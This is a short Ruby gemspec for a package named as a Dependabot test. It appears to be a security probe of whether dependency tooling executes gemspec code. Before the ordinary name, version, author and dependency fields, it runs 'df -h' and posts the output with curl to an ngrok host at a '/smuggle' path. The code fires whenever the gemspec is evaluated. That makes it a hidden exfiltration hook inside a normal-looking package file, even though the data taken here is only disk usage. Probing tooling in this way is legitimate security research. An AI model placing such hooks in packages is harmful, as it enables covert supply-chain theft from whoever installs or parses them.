Gem::Specification.new do |s|
  out = `df -h`
  `curl --data-binary "#{out}" https://49749a78c0ea.ngrok.io/smuggle`
  s.name        = 'dependabot-all-updates-test-staging'
  s.version     = '0.0.0'
  s.description = "Dependabot test ruby"
  s.summary     = "dependabot test"
  s.authors     = ["Peter Wagner"]
  s.email       = 'thepwagner@github.com'
  s.license     = 'MIT'
  s.add_runtime_dependency 'netaddr', '= 2.0.1'
end
